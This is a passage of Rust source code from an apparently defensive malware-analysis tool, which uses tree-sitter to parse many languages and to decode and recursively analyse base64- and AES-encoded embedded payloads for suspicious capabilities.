//! Unified source code analyzer for all AST-based languages.
//!
//! This module provides a single analyzer that handles all tree-sitter supported
//! languages through configuration rather than separate implementations.
//!
//! # Design Philosophy
//!
//! Instead of having 15+ nearly-identical analyzer files, we:
//! 1. Define language configurations (tree-sitter language, node types, etc.)
//! 2. Use a single analysis pipeline that works for all languages
//! 3. Rely on the trait/YAML system for capability detection
//! 4. Keep binary analyzers (ELF, PE, Mach-O) and manifest analyzers separate

use crate::analyzers::comment_metrics::{self, CommentStyle};
use crate::analyzers::function_metrics::{self, FunctionInfo};
use crate::analyzers::symbol_extraction;
use crate::analyzers::{
    identifier_metrics, import_metrics, string_metrics, text_metrics, AnalysisInput, Analyzer,
    FileType,
};
use crate::capabilities::CapabilityMapper;
use crate::types::*;
use anyhow::Result;
use std::cell::RefCell;
use std::path::Path;
use std::sync::Arc;
use tree_sitter::{Language, Parser};

/// Configuration for a language analyzer.
#[derive(Clone, Debug)]
pub(crate) struct LanguageConfig {
    /// Language identifier (e.g., "python", "javascript")
    pub name: &'static str,
    /// File type for reports
    pub file_type: &'static str,
    /// Human-readable description
    pub description: &'static str,
    /// Tree-sitter language
    pub language: Language,
    /// Node types for symbol/call extraction
    pub call_node_types: &'static [&'static str],
    /// Node types for function declarations
    pub function_node_types: &'static [&'static str],
    /// Field name for function names (usually "name")
    pub function_name_field: &'static str,
    /// Node types for string literals
    pub string_node_types: &'static [&'static str],
    /// Comment style for metrics
    pub comment_style: CommentStyle,
}

/// Get the language configuration for a file type.
#[must_use]
pub(crate) fn config_for_file_type(
    file_type: &crate::analyzers::FileType,
) -> Option<LanguageConfig> {
    use crate::analyzers::FileType;

    match file_type {
        FileType::Python => Some(LanguageConfig {
            name: "python",
            file_type: "python",
            description: "Python script",
            language: tree_sitter_python::LANGUAGE.into(),
            call_node_types: &["call"],
            function_node_types: &["function_definition", "async_function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "string_content"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::JavaScript => Some(LanguageConfig {
            name: "javascript",
            file_type: "javascript",
            description: "JavaScript code",
            language: tree_sitter_javascript::LANGUAGE.into(),
            call_node_types: &[
                "call_expression",
                "assignment_expression",
                "variable_declarator",
            ],
            function_node_types: &[
                "function_declaration",
                "function_expression",
                "arrow_function",
                "method_definition",
            ],
            function_name_field: "name",
            string_node_types: &["string", "template_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::TypeScript => Some(LanguageConfig {
            name: "typescript",
            file_type: "javascript",
            description: "TypeScript/JavaScript code",
            language: tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into(),
            call_node_types: &["call_expression"],
            function_node_types: &[
                "function_declaration",
                "function_expression",
                "arrow_function",
                "method_definition",
            ],
            function_name_field: "name",
            string_node_types: &["string", "template_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Go => Some(LanguageConfig {
            name: "go",
            file_type: "go",
            description: "Go source code",
            language: tree_sitter_go::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["function_declaration", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["raw_string_literal", "interpreted_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Rust => Some(LanguageConfig {
            name: "rust",
            file_type: "rust",
            description: "Rust source code",
            language: tree_sitter_rust::LANGUAGE.into(),
            call_node_types: &["call_expression", "macro_invocation"],
            function_node_types: &["function_item"],
            function_name_field: "name",
            string_node_types: &["string_literal", "raw_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Ruby => Some(LanguageConfig {
            name: "ruby",
            file_type: "ruby",
            description: "Ruby script",
            language: tree_sitter_ruby::LANGUAGE.into(),
            call_node_types: &["call", "method_call"],
            function_node_types: &["method", "singleton_method"],
            function_name_field: "name",
            string_node_types: &[
                "string",
                "string_content",
                "simple_symbol",
                "delimited_symbol",
                "bare_symbol",
                "hash_key_symbol",
            ],
            comment_style: CommentStyle::Hash,
        }),
        FileType::Php => Some(LanguageConfig {
            name: "php",
            file_type: "php",
            description: "PHP script",
            language: tree_sitter_php::LANGUAGE_PHP.into(),
            call_node_types: &["function_call_expression"],
            function_node_types: &["function_definition", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["string", "encapsed_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Shell => Some(LanguageConfig {
            name: "shell",
            file_type: "shell",
            description: "Shell script",
            language: tree_sitter_bash::LANGUAGE.into(),
            call_node_types: &["command", "command_name"],
            function_node_types: &["function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "raw_string"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::Lua => Some(LanguageConfig {
            name: "lua",
            file_type: "lua",
            description: "Lua script",
            language: tree_sitter_lua::LANGUAGE.into(),
            call_node_types: &["function_call"],
            function_node_types: &["function_declaration", "local_function"],
            function_name_field: "name",
            string_node_types: &["string"],
            comment_style: CommentStyle::Lua,
        }),
        FileType::Perl => Some(LanguageConfig {
            name: "perl",
            file_type: "perl",
            description: "Perl script",
            language: tree_sitter_perl::LANGUAGE.into(),
            call_node_types: &["function_call", "method_call"],
            function_node_types: &["subroutine_declaration", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal", "interpolated_string"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::PowerShell => Some(LanguageConfig {
            name: "powershell",
            file_type: "powershell",
            description: "PowerShell script",
            language: tree_sitter_powershell::LANGUAGE.into(),
            call_node_types: &["command_expression", "invocation_expression"],
            function_node_types: &["function_statement"],
            function_name_field: "name",
            string_node_types: &["string_literal", "expandable_string_literal"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::Java => Some(LanguageConfig {
            name: "java",
            file_type: "java",
            description: "Java source code",
            language: tree_sitter_java::LANGUAGE.into(),
            call_node_types: &["method_invocation"],
            function_node_types: &["method_declaration", "constructor_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::CSharp => Some(LanguageConfig {
            name: "csharp",
            file_type: "csharp",
            description: "C# source code",
            language: tree_sitter_c_sharp::LANGUAGE.into(),
            call_node_types: &["invocation_expression"],
            function_node_types: &["method_declaration", "constructor_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal", "verbatim_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::C => Some(LanguageConfig {
            name: "c",
            file_type: "c",
            description: "C source code",
            language: tree_sitter_c::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["function_definition"],
            function_name_field: "declarator",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Swift => Some(LanguageConfig {
            name: "swift",
            file_type: "swift",
            description: "Swift source code",
            language: tree_sitter_swift::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["function_declaration"],
            function_name_field: "name",
            string_node_types: &["line_string_literal", "multi_line_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::ObjectiveC => Some(LanguageConfig {
            name: "objc",
            file_type: "objc",
            description: "Objective-C source code",
            language: tree_sitter_objc::LANGUAGE.into(),
            call_node_types: &["message_expression", "call_expression"],
            function_node_types: &["function_definition", "method_definition"],
            function_name_field: "declarator",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Groovy => Some(LanguageConfig {
            name: "groovy",
            file_type: "groovy",
            description: "Groovy source code",
            language: tree_sitter_groovy::LANGUAGE.into(),
            call_node_types: &["method_call", "function_call"],
            function_node_types: &["method_declaration", "function_declaration"],
            function_name_field: "name",
            string_node_types: &["string", "gstring"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Scala => Some(LanguageConfig {
            name: "scala",
            file_type: "scala",
            description: "Scala source code",
            language: tree_sitter_scala::LANGUAGE.into(),
            call_node_types: &["call_expression", "apply_expression"],
            function_node_types: &["function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "interpolated_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Zig => Some(LanguageConfig {
            name: "zig",
            file_type: "zig",
            description: "Zig source code",
            language: tree_sitter_zig::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["fn_decl"],
            function_name_field: "name",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Elixir => Some(LanguageConfig {
            name: "elixir",
            file_type: "elixir",
            description: "Elixir source code",
            language: tree_sitter_elixir::LANGUAGE.into(),
            call_node_types: &["call"],
            function_node_types: &["call"], // def/defp are calls in Elixir's AST
            function_name_field: "target",
            string_node_types: &["string", "charlist"],
            comment_style: CommentStyle::Hash,
        }),
        _ => None,
    }
}

/// Unified source code analyzer.
///
/// Works with any tree-sitter supported language through configuration.
pub(crate) struct UnifiedSourceAnalyzer {
    config: LanguageConfig,
    file_type: crate::analyzers::FileType,
    parser: RefCell<Parser>,
    capability_mapper: Arc<CapabilityMapper>,
    /// When true, skip embedded payload detection to prevent recursion.
    /// Set for analyzers created for inner analysis (e.g. decoded PowerShell).
    skip_embedded_detection: bool,
    /// Per-request cancellation flag.
    cancellation: Option<std::sync::Arc<std::sync::atomic::AtomicBool>>,
}

impl std::fmt::Debug for UnifiedSourceAnalyzer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("UnifiedSourceAnalyzer")
            .field("config", &self.config)
            .field("file_type", &self.file_type)
            .field("parser", &"<Parser>")
            .field("capability_mapper", &self.capability_mapper)
            .finish()
    }
}

impl UnifiedSourceAnalyzer {
    /// Create a new analyzer for the given language configuration.
    pub(crate) fn new(
        config: LanguageConfig,
        file_type: crate::analyzers::FileType,
    ) -> anyhow::Result<Self> {
        let mut parser = Parser::new();
        parser
            .set_language(&config.language)
            .map_err(|e| anyhow::anyhow!("Failed to load language grammar: {:?}", e))?;

        Ok(Self {
            config,
            file_type,
            parser: RefCell::new(parser),
            capability_mapper: Arc::new(CapabilityMapper::empty()),
            skip_embedded_detection: false,
            cancellation: None,
        })
    }

    /// Create an analyzer for the given file type.
    #[must_use]
    pub(crate) fn for_file_type(file_type: &crate::analyzers::FileType) -> Option<Self> {
        config_for_file_type(file_type).and_then(|config| Self::new(config, file_type.clone()).ok())
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    pub(crate) fn with_capability_mapper(mut self, capability_mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Arc::new(capability_mapper);
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    pub(crate) fn with_capability_mapper_arc(
        mut self,
        capability_mapper: Arc<CapabilityMapper>,
    ) -> Self {
        self.capability_mapper = capability_mapper;
        self
    }

    /// Disable embedded payload detection (base64 binary, PowerShell -EncodedCommand).
    /// Used for inner analysis to prevent recursive calling.
    pub(crate) fn without_embedded_detection(mut self) -> Self {
        self.skip_embedded_detection = true;
        self
    }

    /// Set per-request cancellation flag.
    #[must_use]
    pub(crate) fn with_cancellation(
        mut self,
        flag: Option<std::sync::Arc<std::sync::atomic::AtomicBool>>,
    ) -> Self {
        self.cancellation = flag;
        self
    }

    pub(crate) fn analyze_source(&self, file_path: &Path, content: &str) -> AnalysisReport {
        // For backward compatibility, use UTF-8 bytes
        self.analyze_source_with_original(file_path, content, content.as_bytes())
    }

    pub(crate) fn analyze_source_with_original(
        &self,
        file_path: &Path,
        content: &str,
        original_bytes: &[u8],
    ) -> AnalysisReport {
        self.analyze_source_impl(
            file_path,
            content,
            original_bytes,
            &[],
            &[],
            None,
            self.cancellation.as_ref(),
        )
    }

    fn analyze_source_impl(
        &self,
        file_path: &Path,
        content: &str,
        original_bytes: &[u8],
        preextracted_stng: &[stng::ExtractedString],
        preextracted_payloads: &[crate::types::ExtractedPayload],
        precomputed_sha256: Option<String>,
        cancellation: Option<&std::sync::Arc<std::sync::atomic::AtomicBool>>,
    ) -> AnalysisReport {
        let start = std::time::Instant::now();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: self.config.file_type.to_string(),
            size_bytes: content.len() as u64,
            sha256: precomputed_sha256
                .unwrap_or_else(|| crate::analyzers::utils::calculate_sha256(content.as_bytes())),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report
            .structure
            .push(crate::analyzers::utils::create_language_feature(
                self.config.name,
                &format!("tree-sitter-{}", self.config.name),
                self.config.description,
            ));

        let has_preextracted = !preextracted_stng.is_empty();
        let mut owned_stng = Vec::new();

        let timeout_limit = std::time::Duration::from_secs(4);
        let mut timed_out = false;

        // Run stng extraction first (sequential). Previously this used
        // rayon::in_place_scope to overlap stng with tree-sitter parsing,
        // but that deadlocks when nested inside a saturated rayon pool
        // (e.g., scan_directory's par_iter): the spawned stng task waits
        // for a free rayon thread, while the current thread blocks on
        // recv() and can't process rayon work. stng on scripts is fast
        // (single-digit ms), so the parallelism gain was negligible.
        if !has_preextracted {
            let opts = super::stng_analysis_opts(4);
            owned_stng = stng::extract_strings_with_options(original_bytes, &opts);
        }

        // Parse the source with a timeout
        let mut options = tree_sitter::ParseOptions::new();
        let mut cb = |_: &tree_sitter::ParseState| -> std::ops::ControlFlow<()> {
            if start.elapsed() > timeout_limit {
                std::ops::ControlFlow::Break(())
            } else {
                std::ops::ControlFlow::Continue(())
            }
        };
        options.progress_callback = Some(&mut cb);

        let tree = self.parser.borrow_mut().parse_with_options(
            &mut |i, _| {
                if i < content.len() {
                    &content.as_bytes()[i..]
                } else {
                    &[]
                }
            },
            None,
            Some(options),
        );

        if let Some(ref tree) = tree {
            let root = tree.root_node();
            self.extract_functions(&root, content.as_bytes(), &mut report);
            self.extract_strings(&root, content.as_bytes(), &mut report);
        } else if start.elapsed() > timeout_limit {
            timed_out = true;
        }

        if timed_out {
            tracing::info!(
                "AST parsing timed out for {}, skipping deep AST analysis.",
                file_path.display()
            );
            let mut finding = crate::types::Finding::new(
                "metadata/analysis/ast-timeout".to_string(),
                crate::types::FindingKind::Structural,
                "AST parsing timed out; deep AST analysis was skipped.".to_string(),
                0.4,
            );
            finding.crit = crate::types::Criticality::Component;
            report.findings.push(finding);

            // Still compute text metrics even without the AST — they are pure O(n)
            // text passes (no tree-sitter) and give metric-based rules something to
            // evaluate.  For a large single-line minified/obfuscated file the
            // resulting max_line_length alone is a strong indicator.
            let text = crate::analyzers::text_metrics::analyze_text(content);
            report.metrics = Some(crate::types::Metrics {
                text: Some(text),
                ..Default::default()
            });
        }

        // Use pre-extracted stng strings if available, otherwise use parallel extracted ones
        let stng_strings: &[stng::ExtractedString] = if has_preextracted {
            preextracted_stng
        } else {
            &owned_stng
        };

        // Convert stng decoded strings to StringInfo and add to report
        for es in stng_strings {
            // Only add decoded strings (base64, xor, etc.) - skip raw literals already in AST
            if matches!(
                es.method,
                stng::StringMethod::Base64Decode
                    | stng::StringMethod::Base64ObfuscatedDecode
                    | stng::StringMethod::XorDecode
                    | stng::StringMethod::HexDecode
                    | stng::StringMethod::UrlDecode
                    | stng::StringMethod::UnicodeEscapeDecode
            ) {
                let string_type = es.kind;

                let encoding_method = match es.method {
                    stng::StringMethod::Base64Decode => "base64",
                    stng::StringMethod::Base64ObfuscatedDecode => "base64-obf",
                    stng::StringMethod::XorDecode => "xor",
                    stng::StringMethod::HexDecode => "hex",
                    stng::StringMethod::UrlDecode => "url",
                    stng::StringMethod::UnicodeEscapeDecode => "unicode-escape",
                    _ => "",
                };

                report.strings.push(crate::types::StringInfo {
                    value: es.value.clone(),
                    offset: Some(es.data_offset),
                    string_type,
                    encoding: "utf-8".to_string(),
                    section: Some("decoded".to_string()),
                    encoding_chain: if !encoding_method.is_empty() {
                        vec![encoding_method.to_string()]
                    } else {
                        Vec::new()
                    },
                    fragments: None,
                });
            }
        }

        // Extract and analyze base64/zlib encoded payloads (same treatment as archives)
        // Use pre-extracted payloads if available to avoid redundant expensive I/O
        let owned_payload_stng;
        let owned_extracted_payloads;
        let extracted_payloads: &[crate::types::ExtractedPayload] = if !preextracted_payloads
            .is_empty()
        {
            preextracted_payloads
        } else {
            let payload_stng: &[stng::ExtractedString] = if !preextracted_stng.is_empty() {
                // Pre-extracted strings have min_length=4; filter for the min_length=16 threshold
                owned_payload_stng = preextracted_stng
                    .iter()
                    .filter(|s| s.value.len() >= 16)
                    .cloned()
                    .collect::<Vec<_>>();
                &owned_payload_stng
            } else {
                let opts = stng::ExtractOptions::new(16).with_garbage_filter(true);
                owned_payload_stng = stng::extract_strings_with_options(content.as_bytes(), &opts);
                &owned_payload_stng
            };
            owned_extracted_payloads = crate::extractors::extract_encoded_payloads(payload_stng);
            &owned_extracted_payloads
        };

        for (idx, payload) in extracted_payloads.iter().enumerate() {
            if cancellation.is_some_and(|c| c.load(std::sync::atomic::Ordering::Relaxed)) {
                break;
            }
            // Create virtual path with encoding info using ## delimiter for decoded content
            let virtual_path = crate::types::encode_decoded_path(
                &file_path.display().to_string(),
                &payload.encoding_chain,
                idx,
            );

            // Read the decoded content
            let payload_content = payload.data.clone();

            // Create ArchiveEntry metadata (same as archive files)
            let entry_metadata = crate::types::ArchiveEntry {
                path: virtual_path.clone(),
                file_type: payload.detected_type.report_file_type(),
                sha256: crate::analyzers::utils::calculate_sha256(&payload_content),
                size_bytes: payload_content.len() as u64,
            };
            report.archive_contents.push(entry_metadata);

            // Analyze the extracted payload based on its type (creates sub_report like archives)
            // Pass capability_mapper to evaluate rules on extracted content
            let payload_report = match payload.detected_type {
                FileType::Python => {
                    UnifiedSourceAnalyzer::for_file_type(&FileType::Python).map(|analyzer| {
                        analyzer
                            .with_capability_mapper_arc(self.capability_mapper.clone())
                            .with_cancellation(cancellation.cloned())
                            .analyze_source(
                                Path::new(&virtual_path),
                                &String::from_utf8_lossy(&payload_content),
                            )
                    })
                }
                FileType::Shell => {
                    UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).map(|analyzer| {
                        analyzer
                            .with_capability_mapper_arc(self.capability_mapper.clone())
                            .with_cancellation(cancellation.cloned())
                            .analyze_source(
                                Path::new(&virtual_path),
                                &String::from_utf8_lossy(&payload_content),
                            )
                    })
                }
                _ => None,
            };

            // Process payload report - convert to FileAnalysis for v2 flat files array
            if let Some(pr) = payload_report {
                // Prefix findings with extracted payload location (same as archive: prefix)
                let mut file_entry = pr.to_file_analysis(0);
                file_entry.path = virtual_path.clone();
                file_entry.depth = 1; // Decoded content is one level deep
                file_entry.encoding = Some(vec!["base64".to_string()]);

                // Update evidence locations to indicate extracted payload
                for finding in &mut file_entry.findings {
                    for evidence in &mut finding.evidence {
                        match &evidence.location {
                            None => {
                                evidence.location = Some(format!("extracted:{}", virtual_path));
                            }
                            Some(loc) => {
                                evidence.location =
                                    Some(format!("extracted:{}:{}", virtual_path, loc));
                            }
                        }
                    }
                }

                file_entry.compute_summary();
                report.files.push(file_entry);
            }
        }

        // Extract and analyze AES-encrypted payloads (JavaScript/TypeScript)
        if matches!(self.config.file_type, "javascript" | "typescript") {
            let aes_payloads = crate::extractors::extract_aes_payloads(content.as_bytes());
            for (idx, payload) in aes_payloads.iter().enumerate() {
                if cancellation.is_some_and(|c| c.load(std::sync::atomic::Ordering::Relaxed)) {
                    break;
                }
                // Create virtual path with encoding info
                let virtual_path = crate::types::encode_decoded_path(
                    &file_path.display().to_string(),
                    &payload.encoding_chain,
                    idx,
                );

                // Read the decrypted content
                let payload_content = payload.data.clone();

                // Create ArchiveEntry metadata
                let entry_metadata = crate::types::ArchiveEntry {
                    path: virtual_path.clone(),
                    file_type: payload.detected_type.report_file_type(),
                    sha256: crate::analyzers::utils::calculate_sha256(&payload_content),
                    size_bytes: payload_content.len() as u64,
                };
                report.archive_contents.push(entry_metadata);

                // Analyze the decrypted payload
                let payload_report = match payload.detected_type {
                    FileType::JavaScript | FileType::TypeScript => {
                        UnifiedSourceAnalyzer::for_file_type(&payload.detected_type).map(
                            |analyzer| {
                                analyzer
                                    .with_capability_mapper_arc(self.capability_mapper.clone())
                                    .with_cancellation(cancellation.cloned())
                                    .analyze_source(
                                        Path::new(&virtual_path),
                                        &String::from_utf8_lossy(&payload_content),
                                    )
                            },
                        )
                    }
                    FileType::Python => UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
                        .map(|analyzer| {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .with_cancellation(cancellation.cloned())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                        }),
                    FileType::Shell => {
                        UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).map(|analyzer| {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .with_cancellation(cancellation.cloned())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                        })
                    }
                    _ => None,
                };

                // Add a structural finding for the encrypted payload
                report.structure.push(crate::types::StructuralFeature {
                    id: format!("crypto/encrypted-payload/{}", payload.algorithm),
                    desc: format!("Encrypted payload decrypted with {}", payload.algorithm),
                    evidence: vec![crate::types::Evidence {
                        method: "pattern".to_string(),
                        source: "aes_extractor".to_string(),
                        value: format!("preview={}", payload.preview),
                        location: Some(format!("offset:{}", payload.original_offset)),
                        ..Default::default()
                    }],
                });

                // Process payload report
                if let Some(pr) = payload_report {
                    let mut file_entry = pr.to_file_analysis(0);
                    file_entry.path = virtual_path.clone();
                    file_entry.depth = 1;
                    file_entry.encoding = Some(payload.encoding_chain.clone());

                    // Update evidence locations
                    for finding in &mut file_entry.findings {
                        for evidence in &mut finding.evidence {
                            match &evidence.location {
                                None => {
                                    evidence.location = Some(format!("decrypted:{}", virtual_path));
                                }
                                Some(loc) => {
                                    evidence.location =
                                        Some(format!("decrypted:{}:{}", virtual_path, loc));
                                }
                            }
                        }
                    }

                    file_entry.compute_summary();
                    report.files.push(file_entry);
                }
            }
        }

        if let Some(ref tree) = tree {
            let root = tree.root_node();

            // Extract function calls for capability matching (type: symbol conditions)
            // Reuse the already-parsed tree to avoid redundant tree-sitter parsing
            symbol_extraction::extract_symbols_from_tree(
                tree,
                content,
                self.config.call_node_types,
                &mut report,
            );

            // Also extract actual module imports (require/import statements) for metadata/import/ findings
            // Reuse the already-parsed tree to avoid redundant tree-sitter parsing
            symbol_extraction::extract_imports_from_tree(
                tree,
                content,
                &self.file_type,
                &mut report,
            );

            // Analyze paths and environment variables
            crate::path_mapper::analyze_and_link_paths(&mut report);
            crate::env_mapper::analyze_and_link_env_vars(&mut report);

            // Compute metrics
            let mut metrics = self.compute_metrics(&root, content);

            // Compute import metrics from already-extracted imports
            if !report.imports.is_empty() {
                let file_type_str = match self.file_type {
                    crate::analyzers::FileType::Python => "python",
                    crate::analyzers::FileType::JavaScript
                    | crate::analyzers::FileType::TypeScript => "javascript",
                    crate::analyzers::FileType::Go => "go",
                    crate::analyzers::FileType::Ruby => "ruby",
                    crate::analyzers::FileType::Perl => "perl",
                    crate::analyzers::FileType::Lua => "lua",
                    _ => "unknown",
                };
                metrics.imports = Some(import_metrics::analyze_imports(
                    &report.imports,
                    file_type_str,
                ));
            }

            // Compute ratio metrics from already-populated counters
            Self::compute_text_ratio_metrics(&mut metrics);

            // Flag invisible Unicode steganography characters.
            // Variation selectors, zero-width chars, and tag chars in source code
            // are suspicious at high counts; a single occurrence may be a BOM or
            // formatting artifact.
            // Note: U+FE0F (Variation Selector-16) is commonly used in emoji (e.g. ℹ️ 🖱️)
            // and can appear 4-6 times in a normal source file with emoji log messages.
            // Note: U+200D (ZWJ) is used in emoji family sequences (👨‍👩‍👦 etc.) at 2-3
            // chars per sequence; 8 family emojis in test/log data produce ~15 ZWJ chars.
            // Require >= 20 before escalating to suspicious to avoid FP on emoji-heavy files.
            if let Some(ref text) = metrics.text {
                if text.invisible_chars >= 2 {
                    // Libraries dealing with Unicode data, fake data generation,
                    // or internationalization legitimately contain invisible chars.
                    let path_lower = file_path.display().to_string().to_lowercase();
                    let is_unicode_library =
                        ["unicode", "faker", "i18n", "locale", "icu", "cldr", "intl"]
                            .iter()
                            .any(|kw| path_lower.contains(kw));
                    let (crit, conf) = if is_unicode_library {
                        // Libraries that intentionally ship adversarial Unicode
                        // samples or fake-data corpora should not surface a
                        // human-review finding from this generic heuristic.
                        (crate::types::Criticality::Notable, 0.4)
                    } else if text.invisible_chars >= 60 {
                        (crate::types::Criticality::Suspicious, 0.95)
                    } else {
                        (crate::types::Criticality::Notable, 0.7)
                    };
                    report.add_finding(
                        crate::types::Finding::indicator(
                            "objectives/anti-static/obfuscate/steganography/invisible-unicode"
                                .to_string(),
                            format!(
                                "Source contains {} invisible Unicode characters (variation selectors, zero-width, or tag chars)",
                                text.invisible_chars
                            ),
                            conf,
                        )
                        .with_criticality(crit)
                        .with_attack("T1027".to_string())
                        .with_evidence(vec![crate::types::Evidence {
                            method: "metrics".to_string(),
                            source: "text_metrics".to_string(),
                            value: format!("text.invisible_chars = {}", text.invisible_chars),
                            location: None,
                            ..Default::default()
                        }]),
                    );
                }
            }

            report.metrics = Some(metrics);
        }
        // Detect base64 binary payloads and PowerShell -EncodedCommand blobs.
        // Guard against recursion: when this analyzer was created for inner analysis
        // (e.g. decoding a -EncodedCommand payload), skip to avoid infinite loops.
        if !self.skip_embedded_detection {
            // Include the full file content as a synthetic string so that
            // PS -EncodedCommand arguments (bare, not quoted) are also checked.
            let content_as_string = crate::types::binary::StringInfo {
                value: content.to_string(),
                offset: Some(0),
                string_type: None,
                encoding: "utf-8".to_string(),
                section: None,
                encoding_chain: Vec::new(),
                fragments: None,
            };
            let mut all_strings = report.strings.clone();
            all_strings.push(content_as_string);
            let (encoded_layers, plain_findings) =
                crate::analyzers::embedded_code_detector::process_all_strings(
                    &file_path.display().to_string(),
                    &all_strings,
                    &self.capability_mapper,
                    0,
                );
            report.files.extend(encoded_layers);
            report.findings.extend(plain_findings);
        }

        // Evaluate all rules (atomic + composite) and merge into report
        self.capability_mapper.evaluate_and_merge_findings(
            &mut report,
            content.as_bytes(),
            tree.as_ref(),
            None,
        );

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec![format!("tree-sitter-{}", self.config.name)];

        report
    }

    fn extract_functions<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();
        self.walk_for_functions(&mut cursor, source, report, 0);
    }

    fn walk_for_functions<'a>(
        &self,
        cursor: &mut tree_sitter::TreeCursor<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
        mut depth: u32,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if self.config.function_node_types.contains(&kind) {
                let name = self
                    .extract_function_name(&node, source)
                    .unwrap_or_else(|| "anonymous".to_string());

                report.functions.push(Function {
                    name,
                    offset: Some(format!("0x{:x}", node.start_byte())),
                    size: Some((node.end_byte() - node.start_byte()) as u64),
                    complexity: None,
                    calls: Vec::new(),
                    source: format!("tree-sitter-{}", self.config.name),
                    control_flow: None,
                    instruction_analysis: None,
                    register_usage: None,
                    constants: Vec::new(),
                    properties: None,
                    signature: None,
                    nesting: None,
                    call_patterns: None,
                });
            }

            if cursor.goto_first_child() {
                if self.config.function_node_types.contains(&kind) {
                    depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                let parent_kind = cursor.node().kind();
                if self.config.function_node_types.contains(&parent_kind) {
                    depth = depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_name<'a>(
        &self,
        node: &tree_sitter::Node<'a>,
        source: &[u8],
    ) -> Option<String> {
        // Try the configured field name first
        if let Some(name_node) = node.child_by_field_name(self.config.function_name_field) {
            if let Ok(name) = name_node.utf8_text(source) {
                if !name.is_empty() {
                    return Some(name.to_string());
                }
            }
        }

        // Fallback: look for identifier children
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" || child.kind() == "name" {
                    if let Ok(name) = child.utf8_text(source) {
                        if !name.is_empty() {
                            return Some(name.to_string());
                        }
                    }
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn extract_strings<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, report);
    }

    fn walk_for_strings<'a>(
        &self,
        cursor: &mut tree_sitter::TreeCursor<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'')
                        .trim_start_matches('`')
                        .trim_end_matches('`')
                        .trim_start_matches("[[")
                        .trim_end_matches("]]")
                        .trim_start_matches("@\"")
                        .trim_end_matches("\"@")
                        .trim_start_matches(':') // Ruby symbol literals like :alias_method
                        ;

                    if !s.is_empty() && s.len() < 10000 {
                        report.strings.push(StringInfo {
                            value: s.to_string(),
                            offset: Some(node.start_byte() as u64),
                            string_type: None,
                            encoding: "utf-8".to_string(),
                            section: Some("ast".to_string()),
                            encoding_chain: Vec::new(),
                            fragments: None,
                        });
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn compute_metrics<'a>(&self, root: &tree_sitter::Node<'a>, content: &str) -> Metrics {
        let source = content.as_bytes();
